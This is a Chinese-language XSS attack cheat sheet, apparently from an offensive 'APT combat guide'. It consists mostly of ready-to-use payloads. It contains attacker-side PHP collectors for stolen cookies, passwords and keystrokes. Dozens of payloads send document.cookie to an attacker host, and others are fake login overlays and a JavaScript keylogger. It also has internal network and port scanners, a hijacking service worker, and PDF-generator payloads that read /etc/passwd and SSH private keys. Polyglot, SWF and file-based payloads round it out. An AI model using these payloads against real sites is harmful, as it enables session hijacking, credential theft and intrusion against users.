# XSS漏洞

## 1.窃取cookie

攻击者主机colector.php
```php
<?php
  $cookie = $_GET['cookie'];
  $useragent = $_SERVER['HTTP_USER_AGENT'];
  $file = fopen('colector.txt', 'a');
  fwrite($file,"USER AGENT:$useragent\r\nCOOKIE=$cookie\r\n");
  fclose($file);
?>
```

赋予权限
```bash
chmod 755 colector.php
```

payload：
```javascript
<script>document.location='http://攻击者主机地址/colector.php?cookie='+document.cookie</script>
```

其它触发方式：
```javascript
<img src=x onerror=this.src="http://攻击者主机地址/?c="+document.cookie>
<img src=x onerror="location.href='http://攻击者主机地址/?c='+ document.cookie">
<script>new Image().src="http://攻击者主机地址/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://攻击者主机地址/?c="+escape(document.cookie);</script>
<script>location.href = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://攻击者主机地址/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://攻击者主机地址?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://攻击者主机地址/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://攻击者主机地址?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://攻击者主机地址/?c="+document.cookie</script>
<script>window.location="https://攻击者主机地址/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://攻击者主机地址/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovL+aUu+WHu+iAheS4u+acuuWcsOWdgD9jPSIrIGRvY3VtZW50LmNvb2tpZSArIicgLz4iKQ=='));</script>
<script>fetch('https://子域名.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://攻击者主机地址/',document.cookie)</script>
```

## 2.捕获登录凭据

(1)捕获注入页面登录凭据

确认登录表单参数值用户名为username，密码为password。

payload
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('http://攻击者主机',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

(2)凭据钓鱼窗口

payload
```javascript
<style>::placeholder { color:white; }</style>
<script>
document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'> \
<form action='http://攻击者主机/' method='post'> \
<p>你的session已经过期，请重新登录:</p> \
<input style='width:100%;' type='text' name='username' placeholder='Username' /> \
<input style='width: 100%' type='password' name='password' placeholder='Password'/> \
<input type='submit' value='Login'> \
</form> \
<p><i>该登录表单仅为演示作用</i></p> \
</div>")
</script>
```

(3)用户界面修改

payload
```javascript
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form action='http://攻击者主机/capture.php ' method='post'><input style='width:100%;' type='text' name='username' placeholder='Username' />\
<input style='width: 100%' type='password' name='password' placeholder='Password'/><input value='submit' type='submit'></form>"
</script>
```

攻击者主机capture.php:
```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
        file_put_contents('credentials.txt', "Username: $username, Password: $password\n", FILE_APPEND);
		//凭据保存至credentials.txt文件中，需要手动创建该文件并赋予权限
    }
}
?>
```

## 3.键盘记录器

攻击者主机key.php
```php
<?php
  $useragent = $_SERVER['HTTP_USER_AGENT'];
  $log = $_GET["keylog"];
  $file = fopen('captured.txt', 'a');
  //保存到captured.txt文件中
  fwrite($file,"User-Agent:$useragent\r\nKeyLog:$log\r\n");
  fclose($file);
?>
```

payload
```javascript
<img src=x onerror='document.onkeypress=function(e){
    var key = encodeURIComponent(String.fromCharCode(e.which));
    fetch("http://攻击者主机/key.php?keylog=" + key);
},this.remove();'>
```

GitHub tools:

[Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)

[keylogger](https://github.com/rajeshmajumdar/keylogger)

[JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)

## 4.屏幕截图

攻击者主机screenshot.php
```php
<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

//确保脚本仅处理POST请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    //POST请求中的参数为screenshot
    $encodedImage = $_POST['screenshot'];

    //解码POST请求中的数据
    $exploded = explode(',', $encodedImage, 2);

    if (count($exploded) == 2) {
        $encodedImageData = $exploded[1];
            $decodedImageData = base64_decode($encodedImageData);
        //为保存的文件使用唯一名，以避免冲突
        $fileName = uniqid('screenshot_', true) . '.jpeg';

        //保存图片
        if (file_put_contents($fileName, $decodedImageData) !== false) {
            echo "Screenshot saved successfully as {$fileName}.";
        } else {
            echo "Failed to save screenshot.";
        }
    } else {
        echo "Received data is not in expected format.";
    }
} else {
    echo "This script only handles POST requests.";
}
?>
```

payload:

[screenshot.js](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/XSS/screenshot.js)

## 5.扫描主机

(1)扫描主机

```javascript
<script>
var q = []
var collaboratorURL = 'http://攻击者主机/';
var wait = 2000
var n_threads = 50

//使用fetchUrl以枚举所有可能主机
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(){
        fetchUrl(url, wait);
    }
  }('http://192.168.8.'+i+':80'));
}

for(i=1; i<=n_threads; i++){
  if(q.length) q.shift()();
}

function fetchUrl(url, wait){
    console.log(url)
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
    }
  ))
  .catch(e => {
  if(!String(e).includes("The user aborted a request") && q.length) {
    q.shift()();
  }
  });

  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()();
  }
  }, wait);
}
</script>
```

(2)扫描端口号

```javascript
<script>
const checkPort = (port) => {
  fetch(`http://localhost:${port}`, { mode: "no-cors" })
    .then(() => {
      let img = document.createElement("img");
      img.src = `http://攻击者主机/ping?port=${port}`;
      document.body.appendChild(img);
    })
    .catch(e => console.error(`Fetch failed for port ${port}`, e)); };
for(let i = 1; i <= 1000; i++) {  //扫描1-1000之间的端口号
  checkPort(i);
}
</script>
```

## 6.Service Worker

payload
```javascript
// 注册Service Worker
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('http://攻击者主机/service-worker.js')
    .then(function(registration) {
      console.log('Service Worker 注册成功，作用域为: ', registration.scope);
    })
    .catch(function(error) {
      console.log('Service Worker 注册失败: ', error);
    });
}
```

service-worker.js:
```javascript
self.addEventListener('install', function(event) {
  console.log('Service Worker 安装成功');
});

self.addEventListener('fetch', function(event) {
  console.log('拦截到请求: ', event.request.url);
  // 检查请求是否为目标网站的登录请求
  if (event.request.url.endsWith('/login')) {
    // 创建一个新的响应对象，替换原有响应
    const newResponse = new Response('这是一个替换的响应', {
      status: 200,
      statusText: 'OK',
      headers: { 'Content-Type': 'text/plain' }
    });
    // 使用新的响应对象响应fetch事件
    event.respondWith(newResponse);
  }
});
```

GitHub tools:

[shadow-worers](https://shadow-workers.github.io/)

## 7.Shadow DOM

payload
```javascript
<div id="hostElement"></div>
<script>
  var host = document.getElementById('hostElement');
  //访问宿主元素
  var shadow = host.attachShadow({ mode: "open" });
  //附加影子根
  shadow.innerHTML = '<style>h1 {color: red;}</style><h1>恶意脚本来喽</h1>';
  //使用innerHTML将非脚本内容添加到影子根
  var script = document.createElement('script');
  script.textContent = 'alert(1);';
  shadow.appendChild(script);
  //将脚本附加到Shadow DOM
</script>
```

## 8.文件中的XSS

### 文件

(1)png

png.php:
```php
<html>
<body>
	<img src="<?php echo $_GET["id"]?>MyCookie?">
</body>
</html>
```

控制台生成XSS图片：
```javascript
(function() {
    //将字符串编码为图像的DataURL
    function encode(a) {
        if (a.length) {
            var c = a.length,
                e = Math.ceil(Math.sqrt(c / 3)),
                f = e,
                g = document.createElement("canvas"),
                h = g.getContext("2d");
            g.width = e, g.height = f;
            var j = h.getImageData(0, 0, e, f),
                k = j.data,
                l = 0;
            //遍历字符串，将字符的ASCII值赋给像素点
            for (var m = 0; m < f; m++)
                for (var n = 0; n < e; n++) {
                    var o = 4 * (m * e) + 4 * n,
                        p = a[l++],
                        q = a[l++],
                        r = a[l++];
				  //如果字符串存在，将其ASCII值赋给对应的像素点
                    (p || q || r) && (p && (k[o] = ord(p)), q && (k[o + 1] = ord(q)), r && (k[o + 2] = ord(r)), k[o + 3] = 255)
                }
		   //将修改后的像素数据放回canvas，并返回DataURL
            return h.putImageData(j, 0, 0), h.canvas.toDataURL()
        }
    }
    //获取字符的ASCII值
    var ord = function ord(a) {
        var c = a + "",
            e = c.charCodeAt(0);
	    //处理Unicode代理对
        if (55296 <= e && 56319 >= e) {
            if (1 === c.length) return e;
            var f = c.charCodeAt(1);
            return 1024 * (e - 55296) + (f - 56320) + 65536
        }
        return 56320 <= e && 57343 >= e ? e : e
    },
    d = document,
    b = d.body,
    img = new Image;
    //要编码的字符串，包含一个简单的JavaScript函数
    var stringenc = "function asd() {\
        var d = document;\
        var c = 'cookie';\
        alert(d[c]);\
    };asd();";  //可填充字符串以更改图像大小
    //使用encode函数将字符串编码为图像的DataURL，并清空body的内容和添加信图像元素
    img.src = encode(stringenc), b.innerHTML = "", b.appendChild(img)
})();
```

解析图片并执行(需要Base64编码)：
```javascript
// 获取页面上id为'jsimg'的元素
t = document.getElementById("jsimg");
// 创建一个canvas元素并获取其上下文和样式
var s = String.fromCharCode, c = document.createElement("canvas");
var cs = c.style,
    cx = c.getContext("2d"),
    w = t.offsetWidth, // 元素的宽度
    h = t.offsetHeight; // 元素的高度
// 设置canvas的宽高
c.width = w;
c.height = h;
cs.width = w + "px";
cs.height = h + "px";
// 将目标元素绘制到canvas上
cx.drawImage(t, 0, 0);
// 获取canvas上的像素数据
var x = cx.getImageData(0, 0, w, h).data;
// 初始化一个空字符串用于存储解码的字符串
var a = "",
    l = x.length,
    p = -1;
// 遍历像素数据，每四个值（RGBA）为一组，提取RGB值
for (var i = 0; i < l; i += 4) {
    if (x[i + 0]) a += s(x[i + 0]); // R值
    if (x[i + 1]) a += s(x[i + 1]); // G值
    if (x[i + 2]) a += s(x[i + 2]); // B值
}
// 执行解码后的字符串作为JavaScript代码
eval(a);
```

完整payload：
```javascript
http://目标WEB应用程序地址/png.php?id=http://上传图片后的地址/index.png%22+id=%22jsimg%22+onload=%27javascript:eval(atob(%22Base64编码后的有效负载%22))%27%3E%3Ca+href=%22
```

(2)XML

payload
```javascript
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

(3)SVG

payload
```javascript
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

payload
```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

(4)MarkDown

payload
```javascript
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

(5)SWF Flash

payload
```javascript
IE浏览器
IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);

其它
flashmediaelement.swf?jsinitfunctio%gn=alert`1`
flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
plupload.flash.swf?%#target%g=alert&uid%g=XSS&
moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
video-js.swf?readyFunction=alert(1)
player.swf?playerready=alert(document.cookie)
player.swf?tracecall=alert(document.cookie)
banner.swf?clickTAG=javascript:alert(1);//
io.swf?yid=\"));}catch(e){alert(1);}//
video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
```

(6)CSS

payload
```css
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

(7)PostMessage

payload
```javascript
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

(8)GIF

payload
```javascript
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;

example.com/test.php?p=<script src=http://攻击者主机/xss.gif>
```

### 文件名称或描述

payload
```javascript
cp 1.jpg \"\>\<img\ src\ onerror=prompt\(1\)\>.jpg
"><img src=x onerror=alert(document.domain)>.gif
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
"><svg onload=alert(1)>.gif
```

元数据
```bash
exiftool -FIELD=文件
exiftool -Artist=' "><img src=1 onerror=alert(document.domain)>' test.jpeg
exiftool -Artist='"><script>alert(1)</script>' test.jpeg
```

(9)PDF

如果网页使用用户控制的输出创建动态的PDF文件，那么可以尝试创建包含XSS注入的PDF文档以使其执行

探测
```javascript
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<img src="http:攻击者主机"/>
<img src=x onerror="location.href='http://攻击者主机/?c='+ document.cookie">
<script>new Image().src="http://攻击者主机/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://攻击者主机">
```

查看路径
```javascript
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
<script>document.write(document.location.href)</script>
```

加载外部脚本
```javascript
<script src="http://攻击者主机地址/scripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://攻击者主机地址/test.js"></script>')"/>
```

读取本地文件
```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```javascript
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
</script>
```

```javascript
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```javascript
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

检索SSH密钥
```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

PD4ML

一些 HTML2 PDF引擎允许为PDF指定附件，例如PD4ML，攻击者可以滥用该功能将任何本地文件附加到PDF

payload
```javascript
<html><pd4ml:attachment src="/etc/passwd" description="attachment sample" icon="Paperclip"/></html>
```

## 9.URL响应

url:
```javascript
alert(document.cookie)
```

payload
```javascript
<svg/onload=%27fetch("//攻击者主机地址/url").then(r=>r.text().then(t=>eval(t)))%27>
```

## 10.多语言

payload
```javascript
" onclick=alert(1)//<button ' onclick=alert(1)//> */alert(1)/* " onclick=alert(1)//--><img src=x onerror=alert(1)//></img>

%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`

javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>

JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//攻击者主机地址\76-->

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">

';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>

-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>

<svg%0Ao%00nload=%09((pro\u006dpt))()//

javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`

javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
<!'/!”/!\'/\"/ — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //>#

"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>

<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
```

# 其它

更多payload：

[XSS](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/XSS/readme.md)

WAF绕过

[WAF](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/XSS/waf.md)

XSS字典：

[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS)

[500个XSS](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/XSS/500-xss.md)
